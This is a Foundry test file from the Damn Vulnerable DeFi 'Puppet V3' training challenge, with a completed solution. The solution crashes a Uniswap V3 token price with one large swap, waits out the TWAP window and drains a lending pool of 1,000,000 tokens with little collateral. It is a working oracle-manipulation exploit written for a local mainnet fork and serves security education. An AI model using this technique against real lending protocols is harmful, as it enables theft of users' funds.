    // SPDX-License-Identifier: MIT
    // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
    pragma solidity =0.8.25;

    import {Test, console} from "forge-std/Test.sol";
    import {IUniswapV3Factory} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Factory.sol";
    import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
    import {WETH} from "solmate/tokens/WETH.sol";
    import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
    import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
    import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
    import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";

    // Define SwapRouter interface
    interface ISwapRouter {

        // Define struct for ExactInputSingle parameters
        struct ExactInputSingleParams {
            address tokenIn; // DVT address (token to dump)
            address tokenOut; // WETH address (token to receive)
            uint24 fee; // Pool fee tier (0.3% / 3000)
            address recipient; // Recipient address for swapped WETH (attacker)
            uint256 deadline; // Transaction deadline
            uint256 amountIn; // Amount of DVT to dump
            uint256 amountOutMinimum; // Minimum WETH to receive (slippage protection)
            uint160 sqrtPriceLimitX96; // Price limit in Q64.96 format
        }

        // Execute swap
        function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
    }

    contract PuppetV3Challenge is Test {
        address deployer = makeAddr("deployer");
        address player = makeAddr("player");
        address recovery = makeAddr("recovery");

        uint256 constant UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100e18;
        uint256 constant UNISWAP_INITIAL_WETH_LIQUIDITY = 100e18;
        uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 110e18;
        uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;
        uint256 constant LENDING_POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
        uint24 constant FEE = 3000;

        IUniswapV3Factory uniswapFactory = IUniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984);
        INonfungiblePositionManager positionManager =
            INonfungiblePositionManager(payable(0xC36442b4a4522E871399CD717aBDD847Ab11FE88));
        WETH weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
        DamnValuableToken token;
        PuppetV3Pool lendingPool;

        uint256 initialBlockTimestamp;

        modifier checkSolvedByPlayer() {
            vm.startPrank(player, player);
            _;
            vm.stopPrank();
            _isSolved();
        }

        /**
        * SETS UP CHALLENGE - DO NOT TOUCH
        */
        function setUp() public {
            // Fork from mainnet state at specific block
            // This challenge relies on core Uniswap V3 contracts and oracle data deployed on mainnet, requiring a mainnet fork for local testing; RPC URL configuration is required.
			// Create a .env file in the project root to configure the mainnet RPC node URL
            vm.createSelectFork((vm.envString("MAINNET_FORKING_URL")), 15450164);

            startHoax(deployer);

            // Set player's initial balance
            deal(player, PLAYER_INITIAL_ETH_BALANCE);

            // Deployer wraps ETH in WETH
            weth.deposit{value: UNISWAP_INITIAL_WETH_LIQUIDITY}();

            // Deploy DVT token. This is the token to be traded against WETH in the Uniswap v3 pool.
            token = new DamnValuableToken();

            // Create Uniswap v3 pool
            // Sort tokens to prevent creating duplicate trading pairs
            bool isWethFirst = address(weth) < address(token);
            address token0 = isWethFirst ? address(weth) : address(token);
            address token1 = isWethFirst ? address(token) : address(weth);
            // Create and initialize pool, setting fee tier and initial price
            positionManager.createAndInitializePoolIfNecessary({
                token0: token0,
                token1: token1,
                fee: FEE,
                sqrtPriceX96: _encodePriceSqrt(1, 1) // Set initial price ratio to 1:1 (1 DVT = 1 WETH)
            });

            IUniswapV3Pool uniswapPool = IUniswapV3Pool(uniswapFactory.getPool(address(weth), address(token), FEE));
            // Expand oracle observation cardinality slots to 40
            uniswapPool.increaseObservationCardinalityNext(40);

            // Deployer adds liquidity at current price to Uniswap V3 exchange
            // Deployer approves positionManager for unlimited token transfer allowance
            weth.approve(address(positionManager), type(uint256).max); 
            token.approve(address(positionManager), type(uint256).max);
            // Liquidity provider adds liquidity to the pool
            positionManager.mint(
                INonfungiblePositionManager.MintParams({
                    token0: token0, // Token address for pair
                    token1: token1, // Token address for pair
                    tickLower: -60, // Lower tick boundary for liquidity range
                    tickUpper: 60, // Upper tick boundary for liquidity range
                    fee: FEE, // Fee tier (3000 represents 0.3%)
                    recipient: deployer, // Recipient address for the LP NFT
                    amount0Desired: UNISWAP_INITIAL_WETH_LIQUIDITY, // Amount of token0 desired
                    amount1Desired: UNISWAP_INITIAL_TOKEN_LIQUIDITY, // Amount of token1 desired
                    amount0Min: 0, // Minimum amount0 accepted
                    amount1Min: 0, // Minimum amount1 accepted
                    deadline: block.timestamp // Transaction deadline
                })
            );

            // Deploy the lending pool
            lendingPool = new PuppetV3Pool(weth, token, uniswapPool);

            // Setup initial token balances of lending pool and player
            token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
            token.transfer(address(lendingPool), LENDING_POOL_INITIAL_TOKEN_BALANCE);

            // Some time passes
            skip(3 days); // Ensure oracle has sufficient historical observation logs, preventing reverts due to missing historical data at startup

            initialBlockTimestamp = block.timestamp;

            vm.stopPrank();
        }

        /**
        * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
        */
        function test_assertInitialState() public view {
            assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
            assertGt(initialBlockTimestamp, 0);
            assertEq(token.balanceOf(player), PLAYER_INITIAL_TOKEN_BALANCE);
            assertEq(token.balanceOf(address(lendingPool)), LENDING_POOL_INITIAL_TOKEN_BALANCE);
        }

        /**
        * CODE YOUR SOLUTION HERE
        */
        function test_puppetV3() public checkSolvedByPlayer {
            
            // Mainnet SwapRouter address: 0xE592427A0AEce92De3Edee1F18E0157C05861564
            ISwapRouter swapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564); 

            // Approve router contract to spend DVT for dumping tokens to WETH
            token.approve(address(swapRouter), PLAYER_INITIAL_TOKEN_BALANCE);

            // Execute dump operation, dumping all DVT into the pool. Active tick liquidity is exhausted, pushing ticks into an extremely low liquidity range
            swapRouter.exactInputSingle(ISwapRouter.ExactInputSingleParams({
                tokenIn: address(token), // DVT address (token to dump)
                tokenOut: address(weth),  // WETH address (token to receive)
                fee: FEE,  // Pool fee tier (0.3%)
                recipient: player, // Recipient address for swapped WETH (attacker)
                deadline: block.timestamp, // Transaction deadline
                amountIn: PLAYER_INITIAL_TOKEN_BALANCE, // Amount of DVT to dump
                amountOutMinimum: 0, // Minimum WETH to receive (slippage protection)
                sqrtPriceLimitX96: 0  // Price limit in Q64.96 format
            }));

            // Use vm.warp cheatcode to simulate 114s passing after the attack, forcing arithmeticMeanTick to remain suppressed at the crashed price
            vm.warp(block.timestamp + 114 seconds);

            // Calculate WETH required to borrow 1,000,000 DVT
            uint256 amount = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);

            console.log(amount);

            // Approve lendingPool to spend WETH collateral for borrowing
            weth.approve(address(lendingPool), amount);

            // Pass exact required WETH collateral to borrow 1,000,000 DVT
            lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);

            // Transfer all 1,000,000 borrowed DVT to recovery account
            token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);

        }

        /**
        * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
        */
        function _isSolved() private view {
            assertLt(block.timestamp - initialBlockTimestamp, 115, "Too much time passed");
            assertEq(token.balanceOf(address(lendingPool)), 0, "Lending pool still has tokens");
            assertEq(token.balanceOf(recovery), LENDING_POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
        }

        function _encodePriceSqrt(uint256 reserve1, uint256 reserve0) private pure returns (uint160) {
            return uint160(FixedPointMathLib.sqrt((reserve1 * 2 ** 96 * 2 ** 96) / reserve0));
        }
    }
